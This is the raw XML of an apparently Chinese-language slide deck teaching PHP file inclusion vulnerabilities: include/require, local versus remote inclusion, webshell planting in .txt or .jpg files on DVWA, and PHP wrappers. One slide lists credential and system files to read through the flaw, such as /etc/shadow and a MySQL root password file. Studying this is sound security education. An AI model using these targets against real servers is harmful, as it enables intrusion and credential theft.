              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 文件包含</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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47687" y="1028700"/>
            <a:ext cx="9619314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1" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>什么是文件包含</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
              <a:latin typeface="+mn-ea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2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>注入等攻击方式一样，文件包含漏洞也是一种</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" b="1" u="sng" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>注入型漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="+mn-ea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2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>什么叫包含呢？以</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-ea"/>
              </a:rPr>
              <a:t>直接调用此文件</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，而无需再次编写函数，这种文件调用的过程叫做</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>文件包含。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lv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kumimoji="1" lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-ea"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" dirty="0"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9620" y="4128135"/>
            <a:ext cx="4926330" cy="1937385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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1.2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 文件包含漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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47370" y="1201731"/>
            <a:ext cx="7966075" cy="24386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1" lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>什么是文件包含漏洞</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lv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kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>开发人员出于代码灵活性的考虑，会将被包含的文件</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>设置为</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>变量</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，方便进行</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>动态调用</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，从而导致用户端可能恶意调用一些恶意文件</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>路径，造成文件包含漏洞。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
              <a:latin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96266" y="4184813"/>
            <a:ext cx="5033010" cy="1135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kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>常见特征</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t> ==&gt; url?file = XXX</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lv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kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>                       url?page = XX.php</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
              <a:latin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2725" y="3437255"/>
            <a:ext cx="4835525" cy="263017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411470" y="572770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写死</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>函数：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动态</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>变量：</a:t>
            </a:r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9410" y="612775"/>
            <a:ext cx="1627505" cy="34925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9410" y="1119505"/>
            <a:ext cx="1545590" cy="38608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2985" y="1130300"/>
            <a:ext cx="1684655" cy="37465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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1.3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 文件包含相关的四个函数</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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47370" y="1242695"/>
            <a:ext cx="6535420" cy="16046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0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include()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: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使用此函数，代码执行到此处时将文件包含进来，发生报错（比如找不到被包含文件）只警告，还</a:t>
            </a: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会继续执行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文件中的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脚本。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8885" y="1301115"/>
            <a:ext cx="3564255" cy="134937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47370" y="2847975"/>
            <a:ext cx="9584690" cy="37846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0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include_once()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与include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类似，区别在于，当重复调用同一文件时，程序只调用一次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》已经包含过，则</a:t>
            </a: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不会再次被包含</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="20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0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require()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include()有区别，即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找不到被包含文件，会报错，并且</a:t>
            </a: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停止执行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0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require_once()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与require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类似，区别在于，当重复调用同一文件时，程序只调用一次</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="20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693160" y="2784475"/>
            <a:ext cx="7459345" cy="64452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3851275" y="2783840"/>
            <a:ext cx="71304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！</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注意：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>include</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>（）函数并不在意被包含的文件是什么类型，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>只要有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>代码，都会被解析出来</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1.4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 内容补充</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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47370" y="1028700"/>
            <a:ext cx="7513320" cy="169995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文件包含漏洞的形成，需要满足的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="32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两个条件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent4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1、include()等函数通过动态变量的方式引入需要包含的文件；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2、用户能够控制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修改这个动态变量；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47370" y="2596755"/>
            <a:ext cx="6488430" cy="3638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文件包含漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="36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危害</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent4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1、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敏感信息泄露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；本地文件包含可探测到服务配置信息或者是类似password文件这样的敏感信息；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获取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Webshell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；也可构造特殊请求写入日志，然后包含日志文件，获取权限；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、远程文件包含漏洞危害更大，可以通过包含远程文件达到轻松的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执行任意命令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877175" y="1474470"/>
            <a:ext cx="3521075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Tip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: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一般来说服务端通过GET和POST两种请求方式来传递要包含的文件即用户可控的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2870" y="3174423"/>
            <a:ext cx="4179499" cy="181070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" grpId="0"/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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1.5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 文件包含分类（两种）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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226185" y="1341755"/>
            <a:ext cx="5690870" cy="1938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本地文件包含(LFI)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent4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原理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本地文件包含（Local File Include，LFI），能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞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648710" y="3509645"/>
            <a:ext cx="4893945" cy="1938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允许攻击者通过浏览器包含本机上的文件。当一个W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eb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应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞。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（就是前面提到的）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91245" y="3681095"/>
            <a:ext cx="2828925" cy="79565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8545" y="4664710"/>
            <a:ext cx="2841625" cy="89725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1060" y="1567815"/>
            <a:ext cx="4309110" cy="194564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1115" y="274955"/>
            <a:ext cx="5981700" cy="6019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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1.5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 文件包含分类（两种）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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226185" y="1341755"/>
            <a:ext cx="6757670" cy="1938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远程文件包含(RFI)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent4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原理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（前提）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" alt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php.ini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的配置选项</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" alt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allow_url_include</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4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On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此时文件包含函数可加载远程文件，这种漏洞被称为远程文件包含漏洞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280410" y="3208848"/>
            <a:ext cx="7343140" cy="301967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sz="4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利用远程文件包含漏洞，</a:t>
            </a:r>
            <a:endParaRPr sz="4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sz="4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可以直接执行任意命令和获取Webshell</a:t>
            </a:r>
            <a:endParaRPr sz="4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55870" y="1121410"/>
            <a:ext cx="5394960" cy="7239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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>常见的敏感信息（简单介绍）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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790700" y="1378585"/>
            <a:ext cx="6591300" cy="1938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Windows</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="16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C:\Windows\System32\drivers\etc\hosts     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//查看hosts文件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C:\ProgramFiles\mysql\my.ini              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//MySQL配置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C:\ProgramFiles\mysql\data\mysql\user.MYD   //MySQL root密码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C:\windows\php.ini                              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//php 配置信息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790700" y="3666490"/>
            <a:ext cx="5324475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Linux/Unix</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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/etc/passwd                                   //账户信息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/etc/shadow                                  //账户密码文件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/usr/local/app/php5/lib/php.ini    //PHP相关配置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/etc/httpd/conf/httpd.conf           //Apache配置文件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/etc/my.conf                                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//mysql 配置文件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roup 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4517109" y="3288797"/>
            <a:ext cx="3157432" cy="564015"/>
            <a:chOff x="4267200" y="1600200"/>
            <a:chExt cx="3405388" cy="766396"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="85" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5371434" y="1665097"/>
              <a:ext cx="2301154" cy="701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+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>文件包含利用</a:t>
              </a:r>
              <a:endPara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  <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="86" name="Group 5"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4267200" y="1600200"/>
              <a:ext cx="864870" cy="739140"/>
              <a:chOff x="4267199" y="1268631"/>
              <a:chExt cx="1373976" cy="1174236"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="87" name="Rectangle 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4343867" y="1345299"/>
                <a:ext cx="1297308" cy="1097568"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:ln w="5715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3200" b="1" dirty="0">
                    <a:cs typeface="+mn-ea"/>
                    <a:sym typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>2</a:t>
                </a:r>
                <a:endParaRPr lang="en-MY" sz="3200" b="1" dirty="0">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="88" name="Right Triangle 7"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="4267199" y="1268631"/>
                <a:ext cx="455895" cy="455895"/>
              </a:xfrm>
              <a:prstGeom prst="rtTriangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent2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en-MY">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grp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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 文件包含的实现</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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14325" y="2242399"/>
            <a:ext cx="8041640" cy="120565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需要清晰的是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包含的时候，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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不一定</a:t>
            </a:r>
            <a:r>
              <a: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是要去包含</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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php文件</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3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圆角矩形标注 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5572760" y="1174115"/>
            <a:ext cx="3394710" cy="1414780"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRoundRectCallout">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/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像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XX.txt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XX.jpg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XX.phps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等文件，只要是里头包含一块能执行的、完整的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php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代码，内容是可以得到执行的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547370" y="3872865"/>
            <a:ext cx="3787775" cy="1938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DVWA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上的实操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比如我们写个一句话木马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XX.txt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，放在平台文件夹，接着进行复现验证一下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560570" y="3580765"/>
            <a:ext cx="7429500" cy="25222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1"/>
      <p:bldP spid="2" grpId="0" animBg="1"/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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2.2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 文件包含的场景和利用</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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512570" y="2074545"/>
            <a:ext cx="235077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、读敏感文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2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41775" y="1401127"/>
            <a:ext cx="6637655" cy="176720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547370" y="4168775"/>
            <a:ext cx="3919855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、上传可控文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2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前面用过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XX.txt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，尝试用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.jpg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3130" y="3938905"/>
            <a:ext cx="6675120" cy="1905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3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4713330" y="3300043"/>
            <a:ext cx="2764359" cy="564015"/>
            <a:chOff x="4267200" y="1600200"/>
            <a:chExt cx="2981442" cy="766396"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="90" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5371424" y="1665097"/>
              <a:ext cx="1877218" cy="701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+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>php</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US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+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>伪协议</a:t>
              </a:r>
              <a:endPara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  <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="91" name="Group 5"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4267200" y="1600200"/>
              <a:ext cx="864870" cy="739140"/>
              <a:chOff x="4267199" y="1268631"/>
              <a:chExt cx="1373976" cy="1174236"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="92" name="Rectangle 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4343867" y="1345299"/>
                <a:ext cx="1297308" cy="1097568"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:ln w="5715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3200" b="1" dirty="0">
                    <a:cs typeface="+mn-ea"/>
                    <a:sym typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>3</a:t>
                </a:r>
                <a:endParaRPr lang="en-MY" sz="3200" b="1" dirty="0">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="93" name="Right Triangle 7"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="4267199" y="1268631"/>
                <a:ext cx="455895" cy="455895"/>
              </a:xfrm>
              <a:prstGeom prst="rtTriangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent2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en-MY">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grp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547052" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>3.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>伪协议</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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7370" y="1337310"/>
            <a:ext cx="4918710" cy="366395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644831" y="1404033"/>
            <a:ext cx="5931535" cy="27672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主要是熟悉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4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file://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4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4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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4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4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php://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4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endParaRPr lang="zh-CN" altLang="en-US" sz="4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4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zlib://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4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4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data://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4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4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phar://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这几种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3295" y="5001260"/>
            <a:ext cx="1546860" cy="116586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016750" y="4171315"/>
            <a:ext cx="4749165" cy="168905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想了解更多</a:t>
            </a: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~~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（传送门）</a:t>
            </a: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https://www.php.net/manual/zh/wrappers.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" u="sng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536257" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>3.2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>file://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>协议（示例）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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32790" y="2497631"/>
            <a:ext cx="4893310" cy="226485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4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file://[文件的绝对路径和文件名]</a:t>
            </a:r>
